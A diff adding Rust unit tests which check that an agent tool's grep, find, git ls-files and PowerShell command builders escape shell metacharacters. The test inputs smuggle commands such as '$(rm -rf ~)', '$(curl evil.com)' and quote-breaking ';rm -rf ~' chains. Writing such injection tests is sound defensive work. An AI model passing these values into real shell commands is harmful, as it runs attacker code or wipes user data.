@@ -246,3 +246,215 @@ mod path_shell_quoting {
         assert!(cmd.starts_with("test -f "));
     }
 }
+
+mod grep_shell_quoting {
+    //! `target_path` *and* `queries` flow from the agent into the shell command
+    //! `git grep` / `grep` / `Select-String` runs against the user's session.
+    //! Without escaping, an agent-supplied query like `$(touch ~/PWNED)` runs
+    //! as a side-effect of the grep tool call — same silent-RCE class as the
+    //! `is_file_path` / `is_git_repository` probes. These tests pin the
+    //! byte-exact shape of the emitted commands.
+    use super::super::grep::{
+        build_git_grep_command, build_grep_command, build_select_string_command,
+    };
+    use crate::terminal::shell::ShellType;
+
+    #[test]
+    fn git_grep_plain_posix() {
+        assert_eq!(
+            build_git_grep_command(
+                &["TODO".to_string(), "fix".to_string()],
+                "/repo",
+                ShellType::Bash,
+            ),
+            "git --no-pager grep --color=never --untracked -nIE -e TODO -e fix /repo",
+        );
+    }
+
+    #[test]
+    fn git_grep_neutralises_query_command_substitution_posix() {
+        // Without escaping, this would run `touch ~/PWNED` before `git grep`.
+        let cmd = build_git_grep_command(
+            &["$(touch ~/PWNED)".to_string()],
+            "/repo",
+            ShellType::Bash,
+        );
+        assert!(!cmd.contains("$(touch"), "got: {cmd}");
+        assert_eq!(
+            cmd,
+            "git --no-pager grep --color=never --untracked -nIE -e \\$\\(touch\\ \\~/PWNED\\) /repo",
+        );
+    }
+
+    #[test]
+    fn git_grep_neutralises_query_backticks_posix() {
+        let cmd = build_git_grep_command(
+            &["`id`".to_string()],
+            "/repo",
+            ShellType::Bash,
+        );
+        assert!(!cmd.contains("`id`"), "got: {cmd}");
+    }
+
+    #[test]
+    fn git_grep_neutralises_target_substitution_posix() {
+        let cmd = build_git_grep_command(
+            &["foo".to_string()],
+            "/tmp/x$(curl evil.com)",
+            ShellType::Bash,
+        );
+        assert!(!cmd.contains("$(curl"), "got: {cmd}");
+    }
+
+    #[test]
+    fn git_grep_neutralises_query_substitution_powershell() {
+        // PowerShell expands `$(...)` inside `"..."`; with backtick-escaping
+        // the substitution becomes literal text.
+        let cmd = build_git_grep_command(
+            &["$(rm -rf ~)".to_string()],
+            "C:\\repo",
+            ShellType::PowerShell,
+        );
+        assert!(!cmd.contains("$(rm"), "got: {cmd}");
+    }
+
+    #[test]
+    fn grep_neutralises_query_substitution() {
+        let cmd = build_grep_command(&["$(id)".to_string()], "/repo");
+        assert!(!cmd.contains("$(id)"), "got: {cmd}");
+        assert_eq!(
+            cmd,
+            "grep --color=never -nrIHE --devices=skip -e \\$\\(id\\) /repo",
+        );
+    }
+
+    #[test]
+    fn grep_neutralises_query_semicolon_chain() {
+        // A query like `;rm -rf ~` must not turn into a second command.
+        let cmd = build_grep_command(&["x;rm -rf ~".to_string()], "/repo");
+        assert!(!cmd.contains(" ;rm") && !cmd.contains(" -rf "), "got: {cmd}");
+    }
+
+    #[test]
+    fn select_string_neutralises_query_substitution() {
+        // Mirrors the POSIX case for the PowerShell Select-String path.
+        let cmd = build_select_string_command(
+            &["$(rm -rf ~)".to_string()],
+            "C:\\repo",
+        );
+        assert!(!cmd.contains("$(rm"), "got: {cmd}");
+        assert!(cmd.contains("Select-String"));
+    }
+
+    #[test]
+    fn select_string_neutralises_target_substitution() {
+        let cmd = build_select_string_command(
+            &["foo".to_string()],
+            "C:\\tmp\\x$(curl evil.com)y",
+        );
+        assert!(!cmd.contains("$(curl"), "got: {cmd}");
+    }
+}
+
+mod file_glob_shell_quoting {
+    //! `target_path` *and* `patterns` flow from the agent into the shell
+    //! command `find` / `git ls-files` / `Get-ChildItem` runs against the
+    //! user's session. Patterns are particularly easy to miss because the
+    //! previous code wrapped them in `'...'` (POSIX) or `'...'` (PowerShell)
+    //! without escaping embedded `'`, so a pattern containing `'` could close
+    //! the quote and append a fresh shell command. These tests pin the
+    //! byte-exact shape of the emitted commands.
+    use super::super::file_glob::{
+        build_find_command, build_git_ls_files_command, build_powershell_get_childitem_command,
+    };
+
+    #[test]
+    fn find_plain_posix() {
+        assert_eq!(
+            build_find_command(&["*.rs".to_string()], "/repo"),
+            "find /repo -type f  -name \\*.rs",
+        );
+    }
+
+    #[test]
+    fn find_neutralises_pattern_embedded_single_quote() {
+        // A pattern containing `'` previously closed the surrounding `'...'`
+        // pair and could append `; rm -rf ~`. After escaping, the `'` is
+        // backslash-escaped and stays inside the `-name` argument.
+        let cmd = build_find_command(
+            &["foo';rm -rf ~;echo '".to_string()],
+            "/repo",
+        );
+        assert!(
+            !cmd.contains("';rm") && !cmd.contains("rf ~"),
+            "got: {cmd}",
+        );
+    }
+
+    #[test]
+    fn find_neutralises_pattern_substitution() {
+        let cmd = build_find_command(&["$(touch ~/PWNED)".to_string()], "/repo");
+        assert!(!cmd.contains("$(touch"), "got: {cmd}");
+    }
+
+    #[test]
+    fn find_neutralises_target_substitution() {
+        let cmd = build_find_command(&["*.rs".to_string()], "/tmp/x$(id)y");
+        assert!(!cmd.contains("$(id)"), "got: {cmd}");
+    }
+
+    #[test]
+    fn git_ls_files_neutralises_pattern_embedded_single_quote() {
+        let cmd = build_git_ls_files_command(
+            &["foo';rm -rf ~;echo '".to_string()],
+            "/repo",
+            None,
+        );
+        assert!(
+            !cmd.contains("';rm") && !cmd.contains("rf ~"),
+            "got: {cmd}",
+        );
+    }
+
+    #[test]
+    fn git_ls_files_neutralises_pattern_substitution() {
+        let cmd = build_git_ls_files_command(
+            &["$(touch ~/PWNED)".to_string()],
+            "/repo",
+            None,
+        );
+        assert!(!cmd.contains("$(touch"), "got: {cmd}");
+    }
+
+    #[test]
+    fn powershell_get_childitem_neutralises_pattern_embedded_single_quote() {
+        // PowerShell `'...'` literal strings close on `'`, the same way POSIX
+        // ones do; after backtick-escaping, the embedded `'` is literal.
+        let cmd = build_powershell_get_childitem_command(
+            &["foo';rm -rf ~;echo '".to_string()],
+            "C:\\repo",
+        );
+        assert!(
+            !cmd.contains("';rm") && !cmd.contains("rf ~"),
+            "got: {cmd}",
+        );
+    }
+
+    #[test]
+    fn powershell_get_childitem_neutralises_pattern_substitution() {
+        let cmd = build_powershell_get_childitem_command(
+            &["$(rm -rf ~)".to_string()],
+            "C:\\repo",
+        );
+        assert!(!cmd.contains("$(rm"), "got: {cmd}");
+    }
+
+    #[test]
+    fn powershell_get_childitem_neutralises_target_substitution() {
+        let cmd = build_powershell_get_childitem_command(
+            &["*.rs".to_string()],
+            "C:\\tmp\\x$(rm -rf ~)y",
+        );
+        assert!(!cmd.contains("$(rm"), "got: {cmd}");
+    }
+}
